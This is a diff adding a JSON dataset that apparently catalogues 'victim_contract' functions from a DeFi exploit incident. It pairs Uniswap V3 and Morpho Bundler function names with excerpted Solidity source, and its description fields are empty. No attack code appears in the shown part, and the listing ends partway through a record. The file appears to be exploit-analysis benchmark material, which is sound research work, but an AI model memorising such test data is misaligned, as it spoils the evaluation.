@@ -1,0 +1,527 @@
+[
+  {
+    "contract/interface": "IUniswapV3Pool",
+    "source_type": "victim_contract",
+    "function_name": "swap",
+    "original_code": "    function swap(\n        address recipient,\n        bool zeroForOne,\n        int256 amountSpecified,\n        uint160 sqrtPriceLimitX96,\n        bytes calldata data\n    ) external override noDelegateCall returns (int256 amount0, int256 amount1) {\n        require(amountSpecified != 0, 'AS');\n\n        Slot0 memory slot0Start = slot0;\n\n        require(slot0Start.unlocked, 'LOK');\n        require(\n            zeroForOne\n                ? sqrtPriceLimitX96 < slot0Start.sqrtPriceX96 && sqrtPriceLimitX96 > TickMath.MIN_SQRT_RATIO\n                : sqrtPriceLimitX96 > slot0Start.sqrtPriceX96 && sqrtPriceLimitX96 < TickMath.MAX_SQRT_RATIO,\n            'SPL'\n        );\n\n        slot0.unlocked = false;\n\n        SwapCache memory cache =\n            SwapCache({\n                liquidityStart: liquidity,\n                blockTimestamp: _blockTimestamp(),\n                feeProtocol: zeroForOne ? (slot0Start.feeProtocol % 16) : (slot0Start.feeProtocol >> 4),\n                secondsPerLiquidityCumulativeX128: 0,\n                tickCumulative: 0,\n                computedLatestObservation: false\n            });\n\n        bool exactInput = amountSpecified > 0;\n\n        SwapState memory state =\n            SwapState({\n                amountSpecifiedRemaining: amountSpecified,\n                amountCalculated: 0,\n                sqrtPriceX96: slot0Start.sqrtPriceX96,\n                tick: slot0Start.tick,\n                feeGrowthGlobalX128: zeroForOne ? feeGrowthGlobal0X128 : feeGrowthGlobal1X128,\n                protocolFee: 0,\n                liquidity: cache.liquidityStart\n            });\n\n        // continue swapping as long as we haven't used the entire input/output and haven't reached the price limit\n        while (state.amountSpecifiedRemaining != 0 && state.sqrtPriceX96 != sqrtPriceLimitX96) {\n            StepComputations memory step;\n\n            step.sqrtPriceStartX96 = state.sqrtPriceX96;\n\n            (step.tickNext, step.initialized) = tickBitmap.nextInitializedTickWithinOneWord(\n                state.tick,\n                tickSpacing,\n                zeroForOne\n            );\n\n            // ensure that we do not overshoot the min/max tick, as the tick bitmap is not aware of these bounds\n            if (step.tickNext < TickMath.MIN_TICK) {\n                step.tickNext = TickMath.MIN_TICK;\n            } else if (step.tickNext > TickMath.MAX_TICK) {\n                step.tickNext = TickMath.MAX_TICK;\n            }\n\n            // get the price for the next tick\n            step.sqrtPriceNextX96 = TickMath.getSqrtRatioAtTick(step.tickNext);\n\n            // compute values to swap to the target tick, price limit, or point where input/output amount is exhausted\n            (state.sqrtPriceX96, step.amountIn, step.amountOut, step.feeAmount) = SwapMath.computeSwapStep(\n                state.sqrtPriceX96,\n                (zeroForOne ? step.sqrtPriceNextX96 < sqrtPriceLimitX96 : step.sqrtPriceNextX96 > sqrtPriceLimitX96)\n                    ? sqrtPriceLimitX96\n                    : step.sqrtPriceNextX96,\n                state.liquidity,\n                state.amountSpecifiedRemaining,\n                fee\n            );\n\n            if (exactInput) {\n                state.amountSpecifiedRemaining -= (step.amountIn + step.feeAmount).toInt256();\n                state.amountCalculated = state.amountCalculated.sub(step.amountOut.toInt256());\n            } else {\n                state.amountSpecifiedRemaining += step.amountOut.toInt256();\n                state.amountCalculated = state.amountCalculated.add((step.amountIn + step.feeAmount).toInt256());\n            }\n\n            // if the protocol fee is on, calculate how much is owed, decrement feeAmount, and increment protocolFee\n            if (cache.feeProtocol > 0) {\n                uint256 delta = step.feeAmount / cache.feeProtocol;\n                step.feeAmount -= delta;\n                state.protocolFee += uint128(delta);\n            }\n\n            // update global fee tracker\n            if (state.liquidity > 0)\n                state.feeGrowthGlobalX128 += FullMath.mulDiv(step.feeAmount, FixedPoint128.Q128, state.liquidity);\n\n            // shift tick if we reached the next price\n            if (state.sqrtPriceX96 == step.sqrtPriceNextX96) {\n                // if the tick is initialized, run the tick transition\n                if (step.initialized) {\n                    // check for the placeholder value, which we replace with the actual value the first time the swap\n                    // crosses an initialized tick\n                    if (!cache.computedLatestObservation) {\n                        (cache.tickCumulative, cache.secondsPerLiquidityCumulativeX128) = observations.observeSingle(\n                            cache.blockTimestamp,\n                            0,\n                            slot0Start.tick,\n                            slot0Start.observationIndex,\n                            cache.liquidityStart,\n                            slot0Start.observationCardinality\n                        );\n                        cache.computedLatestObservation = true;\n                    }\n                    int128 liquidityNet =\n                        ticks.cross(\n                            step.tickNext,\n                            (zeroForOne ? state.feeGrowthGlobalX128 : feeGrowthGlobal0X128),\n                            (zeroForOne ? feeGrowthGlobal1X128 : state.feeGrowthGlobalX128),\n                            cache.secondsPerLiquidityCumulativeX128,\n                            cache.tickCumulative,\n                            cache.blockTimestamp\n                        );\n                    // if we're moving leftward, we interpret liquidityNet as the opposite sign\n                    // safe because liquidityNet cannot be type(int128).min\n                    if (zeroForOne) liquidityNet = -liquidityNet;\n\n                    state.liquidity = LiquidityMath.addDelta(state.liquidity, liquidityNet);\n                }\n\n                state.tick = zeroForOne ? step.tickNext - 1 : step.tickNext;\n            } else if (state.sqrtPriceX96 != step.sqrtPriceStartX96) {\n                // recompute unless we're on a lower tick boundary (i.e. already transitioned ticks), and haven't moved\n                state.tick = TickMath.getTickAtSqrtRatio(state.sqrtPriceX96);\n            }\n        }\n\n        // update tick and write an oracle entry if the tick change\n        if (state.tick != slot0Start.tick) {\n            (uint16 observationIndex, uint16 observationCardinality) =\n                observations.write(\n                    slot0Start.observationIndex,\n                    cache.blockTimestamp,\n                    slot0Start.tick,\n                    cache.liquidityStart,\n                    slot0Start.observationCardinality,\n                    slot0Start.observationCardinalityNext\n                );\n            (slot0.sqrtPriceX96, slot0.tick, slot0.observationIndex, slot0.observationCardinality) = (\n                state.sqrtPriceX96,\n                state.tick,\n                observationIndex,\n                observationCardinality\n            );\n        } else {\n            // otherwise just update the price\n            slot0.sqrtPriceX96 = state.sqrtPriceX96;\n        }\n\n        // update liquidity if it changed\n        if (cache.liquidityStart != state.liquidity) liquidity = state.liquidity;\n\n        // update fee growth global and, if necessary, protocol fees\n        // overflow is acceptable, protocol has to withdraw before it hits type(uint128).max fees\n        if (zeroForOne) {\n            feeGrowthGlobal0X128 = state.feeGrowthGlobalX128;\n            if (state.protocolFee > 0) protocolFees.token0 += state.protocolFee;\n        } else {\n            feeGrowthGlobal1X128 = state.feeGrowthGlobalX128;\n            if (state.protocolFee > 0) protocolFees.token1 += state.protocolFee;\n        }\n\n        (amount0, amount1) = zeroForOne == exactInput\n            ? (amountSpecified - state.amountSpecifiedRemaining, state.amountCalculated)\n            : (state.amountCalculated, amountSpecified - state.amountSpecifiedRemaining);\n\n        // do the transfers and collect payment\n        if (zeroForOne) {\n            if (amount1 < 0) TransferHelper.safeTransfer(token1, recipient, uint256(-amount1));\n\n            uint256 balance0Before = balance0();\n            IUniswapV3SwapCallback(msg.sender).uniswapV3SwapCallback(amount0, amount1, data);\n            require(balance0Before.add(uint256(amount0)) <= balance0(), 'IIA');\n        } else {\n            if (amount0 < 0) TransferHelper.safeTransfer(token0, recipient, uint256(-amount0));\n\n            uint256 balance1Before = balance1();\n            IUniswapV3SwapCallback(msg.sender).uniswapV3SwapCallback(amount0, amount1, data);\n            require(balance1Before.add(uint256(amount1)) <= balance1(), 'IIA');\n        }\n\n        emit Swap(msg.sender, recipient, amount0, amount1, state.sqrtPriceX96, state.liquidity, state.tick);\n        slot0.unlocked = true;\n    }\n\n    /// @inheritdoc IUniswapV3PoolActions\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "IUniswapV3Pool",
+    "source_type": "victim_contract",
+    "function_name": "token0",
+    "original_code": "",
+    "description": ""
+  },
+  {
+    "contract/interface": "IUniswapV3Pool",
+    "source_type": "victim_contract",
+    "function_name": "token1",
+    "original_code": "",
+    "description": ""
+  },
+  {
+    "contract/interface": "IMorpho",
+    "source_type": "victim_contract",
+    "function_name": "setAuthorization",
+    "original_code": "",
+    "description": ""
+  },
+  {
+    "contract/interface": "IMorphoBundler",
+    "source_type": "victim_contract",
+    "function_name": "MORPHO",
+    "original_code": "",
+    "description": ""
+  },
+  {
+    "contract/interface": "IMorphoBundler",
+    "source_type": "victim_contract",
+    "function_name": "ST_ETH",
+    "original_code": "",
+    "description": ""
+  },
+  {
+    "contract/interface": "IMorphoBundler",
+    "source_type": "victim_contract",
+    "function_name": "WRAPPED_NATIVE",
+    "original_code": "",
+    "description": ""
+  },
+  {
+    "contract/interface": "IMorphoBundler",
+    "source_type": "victim_contract",
+    "function_name": "WST_ETH",
+    "original_code": "",
+    "description": ""
+  },
+  {
+    "contract/interface": "IMorphoBundler",
+    "source_type": "victim_contract",
+    "function_name": "approve2",
+    "original_code": "    function approve2(IAllowanceTransfer.PermitSingle calldata permitSingle, bytes calldata signature, bool skipRevert)\n        external\n        payable\n        protected\n    {\n        try Permit2Lib.PERMIT2.permit(initiator(), permitSingle, signature) {}\n        catch (bytes memory returnData) {\n            if (!skipRevert) _revert(returnData);\n        }\n    }\n\n    /// @notice Transfers the given `amount` of `asset` from the initiator to the bundler via Permit2.\n    /// @param asset The address of the ERC20 token to transfer.\n    /// @param amount The amount of `asset` to transfer from the initiator. Capped at the initiator's balance.\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "IMorphoBundler",
+    "source_type": "victim_contract",
+    "function_name": "erc20Transfer",
+    "original_code": "    function erc20Transfer(address asset, address recipient, uint256 amount) external payable protected {\n        require(recipient != address(0), ErrorsLib.ZERO_ADDRESS);\n        require(recipient != address(this), ErrorsLib.BUNDLER_ADDRESS);\n\n        amount = Math.min(amount, ERC20(asset).balanceOf(address(this)));\n\n        if (amount == 0) return;\n\n        ERC20(asset).safeTransfer(recipient, amount);\n    }\n\n    /// @notice Transfers the given `amount` of `asset` from sender to this contract via ERC20 transferFrom.\n    /// @notice User must have given sufficient allowance to the Bundler to spend their tokens.\n    /// @param asset The address of the ERC20 token to transfer.\n    /// @param amount The amount of `asset` to transfer from the initiator. Capped at the initiator's balance.\n    function erc20TransferFrom(address asset, uint256 amount) external payable protected {\n        address _initiator = initiator();\n        amount = Math.min(amount, ERC20(asset).balanceOf(_initiator));\n\n        require(amount != 0, ErrorsLib.ZERO_AMOUNT);\n\n        ERC20(asset).safeTransferFrom(_initiator, address(this), amount);\n    }\n}\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "IMorphoBundler",
+    "source_type": "victim_contract",
+    "function_name": "erc20TransferFrom",
+    "original_code": "    function erc20TransferFrom(address asset, uint256 amount) external payable protected {\n        address _initiator = initiator();\n        amount = Math.min(amount, ERC20(asset).balanceOf(_initiator));\n\n        require(amount != 0, ErrorsLib.ZERO_AMOUNT);\n\n        ERC20(asset).safeTransferFrom(_initiator, address(this), amount);\n    }\n}\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "IMorphoBundler",
+    "source_type": "victim_contract",
+    "function_name": "erc20WrapperDepositFor",
+    "original_code": "    function erc20WrapperDepositFor(address wrapper, uint256 amount) external payable protected {\n        ERC20 underlying = ERC20(address(ERC20Wrapper(wrapper).underlying()));\n\n        amount = Math.min(amount, underlying.balanceOf(address(this)));\n\n        require(amount != 0, ErrorsLib.ZERO_AMOUNT);\n\n        _approveMaxTo(address(underlying), wrapper);\n\n        require(ERC20Wrapper(wrapper).depositFor(initiator(), amount), ErrorsLib.DEPOSIT_FAILED);\n    }\n\n    /// @notice Burns a number of wrapped tokens and withdraws the corresponding number of underlying tokens.\n    /// @dev Initiator must have previously transferred their wrapped tokens to the bundler.\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "IMorphoBundler",
+    "source_type": "victim_contract",
+    "function_name": "erc20WrapperWithdrawTo",
+    "original_code": "    function erc20WrapperWithdrawTo(address wrapper, address account, uint256 amount) external payable protected {\n        require(account != address(0), ErrorsLib.ZERO_ADDRESS);\n\n        amount = Math.min(amount, ERC20(wrapper).balanceOf(address(this)));\n\n        require(amount != 0, ErrorsLib.ZERO_AMOUNT);\n\n        require(ERC20Wrapper(wrapper).withdrawTo(account, amount), ErrorsLib.WITHDRAW_FAILED);\n    }\n}\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "IMorphoBundler",
+    "source_type": "victim_contract",
+    "function_name": "erc4626Deposit",
+    "original_code": "    function erc4626Deposit(address vault, uint256 assets, uint256 minShares, address receiver)\n        external\n        payable\n        protected\n    {\n        /// Do not check `receiver != address(this)` to allow the bundler to receive the vault's shares.\n        require(receiver != address(0), ErrorsLib.ZERO_ADDRESS);\n\n        uint256 initialAssets = assets;\n        address asset = IERC4626(vault).asset();\n        assets = Math.min(assets, ERC20(asset).balanceOf(address(this)));\n\n        require(assets != 0, ErrorsLib.ZERO_AMOUNT);\n\n        _approveMaxTo(asset, vault);\n\n        uint256 shares = IERC4626(vault).deposit(assets, receiver);\n        require(shares * initialAssets >= minShares * assets, ErrorsLib.SLIPPAGE_EXCEEDED);\n    }\n\n    /// @notice Withdraws the given amount of `assets` from the given ERC4626 `vault`, transferring assets to\n    /// `receiver`.\n    /// @dev Assumes the given `vault` implements EIP-4626.\n    /// @param vault The address of the vault.\n    /// @param assets The amount of assets to withdraw.\n    /// @param maxShares The maximum amount of shares to redeem in exchange for `assets`.\n    /// @param receiver The address that will receive the withdrawn assets.\n    /// @param owner The address on behalf of which the assets are withdrawn. Can only be the bundler or the initiator.\n    /// If `owner` is the initiator, they must have previously approved the bundler to spend their vault shares.\n    /// Otherwise, they must have previously transferred their vault shares to the bundler.\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "IMorphoBundler",
+    "source_type": "victim_contract",
+    "function_name": "erc4626Mint",
+    "original_code": "    function erc4626Mint(address vault, uint256 shares, uint256 maxAssets, address receiver)\n        external\n        payable\n        protected\n    {\n        /// Do not check `receiver != address(this)` to allow the bundler to receive the vault's shares.\n        require(receiver != address(0), ErrorsLib.ZERO_ADDRESS);\n        require(shares != 0, ErrorsLib.ZERO_SHARES);\n\n        _approveMaxTo(IERC4626(vault).asset(), vault);\n\n        uint256 assets = IERC4626(vault).mint(shares, receiver);\n        require(assets <= maxAssets, ErrorsLib.SLIPPAGE_EXCEEDED);\n    }\n\n    /// @notice Deposits the given amount of `assets` on the given ERC4626 `vault`, on behalf of `receiver`.\n    /// @dev Initiator must have previously transferred their assets to the bundler.\n    /// @dev Assumes the given `vault` implements EIP-4626.\n    /// @param vault The address of the vault.\n    /// @param assets The amount of assets to deposit. Capped at the bundler's assets.\n    /// @param minShares The minimum amount of shares to mint in exchange for `assets`. This parameter is proportionally\n    /// scaled down in case there are fewer assets than `assets` on the bundler.\n    /// @param receiver The address to which shares will be minted.\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "IMorphoBundler",
+    "source_type": "victim_contract",
+    "function_name": "erc4626Redeem",
+    "original_code": "    function erc4626Redeem(address vault, uint256 shares, uint256 minAssets, address receiver, address owner)\n        external\n        payable\n        protected\n    {\n        /// Do not check `receiver != address(this)` to allow the bundler to receive the underlying asset.\n        require(receiver != address(0), ErrorsLib.ZERO_ADDRESS);\n        require(owner == address(this) || owner == initiator(), ErrorsLib.UNEXPECTED_OWNER);\n\n        uint256 initialShares = shares;\n        shares = Math.min(shares, IERC4626(vault).balanceOf(owner));\n\n        require(shares != 0, ErrorsLib.ZERO_SHARES);\n\n        uint256 assets = IERC4626(vault).redeem(shares, receiver, owner);\n        require(assets * initialShares >= minAssets * shares, ErrorsLib.SLIPPAGE_EXCEEDED);\n    }\n}\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "IMorphoBundler",
+    "source_type": "victim_contract",
+    "function_name": "erc4626Withdraw",
+    "original_code": "    function erc4626Withdraw(address vault, uint256 assets, uint256 maxShares, address receiver, address owner)\n        external\n        payable\n        protected\n    {\n        /// Do not check `receiver != address(this)` to allow the bundler to receive the underlying asset.\n        require(receiver != address(0), ErrorsLib.ZERO_ADDRESS);\n        require(owner == address(this) || owner == initiator(), ErrorsLib.UNEXPECTED_OWNER);\n        require(assets != 0, ErrorsLib.ZERO_AMOUNT);\n\n        uint256 shares = IERC4626(vault).withdraw(assets, receiver, owner);\n        require(shares <= maxShares, ErrorsLib.SLIPPAGE_EXCEEDED);\n    }\n\n    /// @notice Redeems the given amount of `shares` from the given ERC4626 `vault`, transferring assets to `receiver`.\n    /// @dev Assumes the given `vault` implements EIP-4626.\n    /// @param vault The address of the vault.\n    /// @param shares The amount of shares to redeem. Capped at the owner's shares.\n    /// @param minAssets The minimum amount of assets to withdraw in exchange for `shares`. This parameter is\n    /// proportionally scaled down in case the owner holds fewer shares than `shares`.\n    /// @param receiver The address that will receive the withdrawn assets.\n    /// @param owner The address on behalf of which the shares are redeemed. Can only be the bundler or the initiator.\n    /// If `owner` is the initiator, they must have previously approved the bundler to spend their vault shares.\n    /// Otherwise, they must have previously transferred their vault shares to the bundler.\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "IMorphoBundler",
+    "source_type": "victim_contract",
+    "function_name": "initiator",
+    "original_code": "    function initiator() public view returns (address) {\n        return _initiator;\n    }\n\n    /* EXTERNAL */\n\n    /// @notice Executes a series of delegate calls to the contract itself.\n    /// @dev Locks the initiator so that the sender can uniquely be identified in callbacks.\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "IMorphoBundler",
+    "source_type": "victim_contract",
+    "function_name": "morphoBorrow",
+    "original_code": "    function morphoBorrow(\n        MarketParams calldata marketParams,\n        uint256 assets,\n        uint256 shares,\n        uint256 slippageAmount,\n        address receiver\n    ) external payable protected {\n        (uint256 borrowedAssets, uint256 borrowedShares) =\n            MORPHO.borrow(marketParams, assets, shares, initiator(), receiver);\n\n        if (assets > 0) require(borrowedShares <= slippageAmount, ErrorsLib.SLIPPAGE_EXCEEDED);\n        else require(borrowedAssets >= slippageAmount, ErrorsLib.SLIPPAGE_EXCEEDED);\n    }\n\n    /// @notice Repays `assets` of the loan asset on behalf of `onBehalf`.\n    /// @dev Either `assets` or `shares` should be zero. Most usecases should rely on `assets` as an input so the\n    /// bundler is guaranteed to have `assets` tokens pulled from its balance, but the possibility to burn a specific\n    /// amount of shares is given for full compatibility and precision.\n    /// @param marketParams The Morpho market to repay assets to.\n    /// @param assets The amount of assets to repay. Pass `type(uint256).max` to repay the bundler's loan asset balance.\n    /// @param shares The amount of shares to burn.\n    /// @param slippageAmount The minimum amount of borrow shares to burn in exchange for `assets` when it is used.\n    /// The maximum amount of assets to deposit in exchange for `shares` otherwise.\n    /// @param onBehalf The address of the owner of the debt position.\n    /// @param data Arbitrary data to pass to the `onMorphoRepay` callback. Pass empty data if not needed.\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "IMorphoBundler",
+    "source_type": "victim_contract",
+    "function_name": "morphoFlashLoan",
+    "original_code": "    function morphoFlashLoan(address token, uint256 assets, bytes calldata data) external payable protected {\n        _approveMaxTo(token, address(MORPHO));\n\n        MORPHO.flashLoan(token, assets, data);\n    }\n\n    /// @notice Reallocates funds from markets of a vault to another market of that same vault.\n    /// @param publicAllocator The address of the public allocator.\n    /// @param vault The address of the vault.\n    /// @param value The value in ETH to pay for the reallocate fee.\n    /// @param withdrawals The list of markets and corresponding amounts to withdraw.\n    /// @param supplyMarketParams The market receiving the funds.\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "IMorphoBundler",
+    "source_type": "victim_contract",
+    "function_name": "morphoRepay",
+    "original_code": "    function morphoRepay(\n        MarketParams calldata marketParams,\n        uint256 assets,\n        uint256 shares,\n        uint256 slippageAmount,\n        address onBehalf,\n        bytes calldata data\n    ) external payable protected {\n        // Do not check `onBehalf` against the zero address as it's done at Morpho's level.\n        require(onBehalf != address(this), ErrorsLib.BUNDLER_ADDRESS);\n\n        // Don't always cap the assets to the bundler's balance because the liquidity can be transferred later\n        // (via the `onMorphoRepay` callback).\n        if (assets == type(uint256).max) assets = ERC20(marketParams.loanToken).balanceOf(address(this));\n\n        _approveMaxTo(marketParams.loanToken, address(MORPHO));\n\n        (uint256 repaidAssets, uint256 repaidShares) = MORPHO.repay(marketParams, assets, shares, onBehalf, data);\n\n        if (assets > 0) require(repaidShares >= slippageAmount, ErrorsLib.SLIPPAGE_EXCEEDED);\n        else require(repaidAssets <= slippageAmount, ErrorsLib.SLIPPAGE_EXCEEDED);\n    }\n\n    /// @notice Withdraws `assets` of the loan asset on behalf of the initiator.\n    /// @dev Either `assets` or `shares` should be zero. Most usecases should rely on `assets` as an input so the\n    /// initiator is guaranteed to withdraw `assets` tokens, but the possibility to burn a specific amount of shares is\n    /// given for full compatibility and precision.\n    /// @dev Initiator must have previously authorized the bundler to act on their behalf on Morpho.\n    /// @param marketParams The Morpho market to withdraw assets from.\n    /// @param assets The amount of assets to withdraw.\n    /// @param shares The amount of shares to burn.\n    /// @param slippageAmount The maximum amount of supply shares to burn in exchange for `assets` when it is used.\n    /// The minimum amount of assets to withdraw in exchange for `shares` otherwise.\n    /// @param receiver The address that will receive the withdrawn assets.\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "IMorphoBundler",
+    "source_type": "victim_contract",
+    "function_name": "morphoSetAuthorizationWithSig",
+    "original_code": "    function morphoSetAuthorizationWithSig(\n        Authorization calldata authorization,\n        Signature calldata signature,\n        bool skipRevert\n    ) external payable protected {\n        try MORPHO.setAuthorizationWithSig(authorization, signature) {}\n        catch (bytes memory returnData) {\n            if (!skipRevert) _revert(returnData);\n        }\n    }\n\n    /// @notice Supplies `assets` of the loan asset on behalf of `onBehalf`.\n    /// @notice The supplied assets cannot be used as collateral but is eligible to earn interest.\n    /// @dev Either `assets` or `shares` should be zero. Most usecases should rely on `assets` as an input so the\n    /// bundler is guaranteed to have `assets` tokens pulled from its balance, but the possibility to mint a specific\n    /// amount of shares is given for full compatibility and precision.\n    /// @dev Initiator must have previously transferred their assets to the bundler.\n    /// @param marketParams The Morpho market to supply assets to.\n    /// @param assets The amount of assets to supply. Pass `type(uint256).max` to supply the bundler's loan asset\n    /// balance.\n    /// @param shares The amount of shares to mint.\n    /// @param slippageAmount The minimum amount of supply shares to mint in exchange for `assets` when it is used.\n    /// The maximum amount of assets to deposit in exchange for `shares` otherwise.\n    /// @param onBehalf The address that will own the increased supply position.\n    /// @param data Arbitrary data to pass to the `onMorphoSupply` callback. Pass empty data if not needed.\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "IMorphoBundler",
+    "source_type": "victim_contract",
+    "function_name": "morphoSupply",
+    "original_code": "    function morphoSupply(\n        MarketParams calldata marketParams,\n        uint256 assets,\n        uint256 shares,\n        uint256 slippageAmount,\n        address onBehalf,\n        bytes calldata data\n    ) external payable protected {\n        // Do not check `onBehalf` against the zero address as it's done at Morpho's level.\n        require(onBehalf != address(this), ErrorsLib.BUNDLER_ADDRESS);\n\n        // Don't always cap the assets to the bundler's balance because the liquidity can be transferred later\n        // (via the `onMorphoSupply` callback).\n        if (assets == type(uint256).max) assets = ERC20(marketParams.loanToken).balanceOf(address(this));\n\n        _approveMaxTo(marketParams.loanToken, address(MORPHO));\n\n        (uint256 suppliedAssets, uint256 suppliedShares) = MORPHO.supply(marketParams, assets, shares, onBehalf, data);\n\n        if (assets > 0) require(suppliedShares >= slippageAmount, ErrorsLib.SLIPPAGE_EXCEEDED);\n        else require(suppliedAssets <= slippageAmount, ErrorsLib.SLIPPAGE_EXCEEDED);\n    }\n\n    /// @notice Supplies `assets` of collateral on behalf of `onBehalf`.\n    /// @dev Initiator must have previously transferred their assets to the bundler.\n    /// @param marketParams The Morpho market to supply collateral to.\n    /// @param assets The amount of collateral to supply. Pass `type(uint256).max` to supply the bundler's loan asset\n    /// balance.\n    /// @param onBehalf The address that will own the increased collateral position.\n    /// @param data Arbitrary data to pass to the `onMorphoSupplyCollateral` callback. Pass empty data if not needed.\n    function morphoSupplyCollateral(\n        MarketParams calldata marketParams,\n        uint256 assets,\n        address onBehalf,\n        bytes calldata data\n    ) external payable protected {\n        // Do not check `onBehalf` against the zero address as it's done at Morpho's level.\n        require(onBehalf != address(this), ErrorsLib.BUNDLER_ADDRESS);\n\n        // Don't always cap the assets to the bundler's balance because the liquidity can be transferred later\n        // (via the `onMorphoSupplyCollateral` callback).\n        if (assets == type(uint256).max) assets = ERC20(marketParams.collateralToken).balanceOf(address(this));\n\n        _approveMaxTo(marketParams.collateralToken, address(MORPHO));\n\n        MORPHO.supplyCollateral(marketParams, assets, onBehalf, data);\n    }\n\n    /// @notice Borrows `assets` of the loan asset on behalf of the initiator.\n    /// @dev Either `assets` or `shares` should be zero. Most usecases should rely on `assets` as an input so the\n    /// initiator is guaranteed to borrow `assets` tokens, but the possibility to mint a specific amount of shares is\n    /// given for full compatibility and precision.\n    /// @dev Initiator must have previously authorized the bundler to act on their behalf on Morpho.\n    /// @param marketParams The Morpho market to borrow assets from.\n    /// @param assets The amount of assets to borrow.\n    /// @param shares The amount of shares to mint.\n    /// @param slippageAmount The maximum amount of borrow shares to mint in exchange for `assets` when it is used.\n    /// The minimum amount of assets to borrow in exchange for `shares` otherwise.\n    /// @param receiver The address that will receive the borrowed assets.\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "IMorphoBundler",
+    "source_type": "victim_contract",
+    "function_name": "morphoSupplyCollateral",
+    "original_code": "    function morphoSupplyCollateral(\n        MarketParams calldata marketParams,\n        uint256 assets,\n        address onBehalf,\n        bytes calldata data\n    ) external payable protected {\n        // Do not check `onBehalf` against the zero address as it's done at Morpho's level.\n        require(onBehalf != address(this), ErrorsLib.BUNDLER_ADDRESS);\n\n        // Don't always cap the assets to the bundler's balance because the liquidity can be transferred later\n        // (via the `onMorphoSupplyCollateral` callback).\n        if (assets == type(uint256).max) assets = ERC20(marketParams.collateralToken).balanceOf(address(this));\n\n        _approveMaxTo(marketParams.collateralToken, address(MORPHO));\n\n        MORPHO.supplyCollateral(marketParams, assets, onBehalf, data);\n    }\n\n    /// @notice Borrows `assets` of the loan asset on behalf of the initiator.\n    /// @dev Either `assets` or `shares` should be zero. Most usecases should rely on `assets` as an input so the\n    /// initiator is guaranteed to borrow `assets` tokens, but the possibility to mint a specific amount of shares is\n    /// given for full compatibility and precision.\n    /// @dev Initiator must have previously authorized the bundler to act on their behalf on Morpho.\n    /// @param marketParams The Morpho market to borrow assets from.\n    /// @param assets The amount of assets to borrow.\n    /// @param shares The amount of shares to mint.\n    /// @param slippageAmount The maximum amount of borrow shares to mint in exchange for `assets` when it is used.\n    /// The minimum amount of assets to borrow in exchange for `shares` otherwise.\n    /// @param receiver The address that will receive the borrowed assets.\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "IMorphoBundler",
+    "source_type": "victim_contract",
+    "function_name": "morphoWithdraw",
+    "original_code": "    function morphoWithdraw(\n        MarketParams calldata marketParams,\n        uint256 assets,\n        uint256 shares,\n        uint256 slippageAmount,\n        address receiver\n    ) external payable protected {\n        (uint256 withdrawnAssets, uint256 withdrawnShares) =\n            MORPHO.withdraw(marketParams, assets, shares, initiator(), receiver);\n\n        if (assets > 0) require(withdrawnShares <= slippageAmount, ErrorsLib.SLIPPAGE_EXCEEDED);\n        else require(withdrawnAssets >= slippageAmount, ErrorsLib.SLIPPAGE_EXCEEDED);\n    }\n\n    /// @notice Withdraws `assets` of the collateral asset on behalf of the initiator.\n    /// @dev Initiator must have previously authorized the bundler to act on their behalf on Morpho.\n    /// @param marketParams The Morpho market to withdraw collateral from.\n    /// @param assets The amount of collateral to withdraw.\n    /// @param receiver The address that will receive the collateral assets.\n    function morphoWithdrawCollateral(MarketParams calldata marketParams, uint256 assets, address receiver)\n        external\n        payable\n        protected\n    {\n        MORPHO.withdrawCollateral(marketParams, assets, initiator(), receiver);\n    }\n\n    /// @notice Triggers a flash loan on Morpho.\n    /// @param token The address of the token to flash loan.\n    /// @param assets The amount of assets to flash loan.\n    /// @param data Arbitrary data to pass to the `onMorphoFlashLoan` callback.\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "IMorphoBundler",
+    "source_type": "victim_contract",
+    "function_name": "morphoWithdrawCollateral",
+    "original_code": "    function morphoWithdrawCollateral(MarketParams calldata marketParams, uint256 assets, address receiver)\n        external\n        payable\n        protected\n    {\n        MORPHO.withdrawCollateral(marketParams, assets, initiator(), receiver);\n    }\n\n    /// @notice Triggers a flash loan on Morpho.\n    /// @param token The address of the token to flash loan.\n    /// @param assets The amount of assets to flash loan.\n    /// @param data Arbitrary data to pass to the `onMorphoFlashLoan` callback.\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "IMorphoBundler",
+    "source_type": "victim_contract",
+    "function_name": "multicall",
+    "original_code": "    function multicall(bytes[] memory data) external payable {\n        require(_initiator == UNSET_INITIATOR, ErrorsLib.ALREADY_INITIATED);\n\n        _initiator = msg.sender;\n\n        _multicall(data);\n\n        _initiator = UNSET_INITIATOR;\n    }\n\n    /* INTERNAL */\n\n    /// @dev Executes a series of delegate calls to the contract itself.\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "IMorphoBundler",
+    "source_type": "victim_contract",
+    "function_name": "nativeTransfer",
+    "original_code": "    function nativeTransfer(address recipient, uint256 amount) external payable protected {\n        require(recipient != address(0), ErrorsLib.ZERO_ADDRESS);\n        require(recipient != address(this), ErrorsLib.BUNDLER_ADDRESS);\n\n        amount = Math.min(amount, address(this).balance);\n\n        if (amount == 0) return;\n\n        SafeTransferLib.safeTransferETH(recipient, amount);\n    }\n\n    /// @notice Transfers the minimum between the given `amount` and the bundler's balance of `asset` from the bundler\n    /// to `recipient`.\n    /// @dev If the minimum happens to be zero, the transfer is silently skipped.\n    /// @param asset The address of the ERC20 token to transfer.\n    /// @param recipient The address that will receive the tokens.\n    /// @param amount The amount of `asset` to transfer. Capped at the bundler's balance.\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "IMorphoBundler",
+    "source_type": "victim_contract",
+    "function_name": "onMorphoFlashLoan",
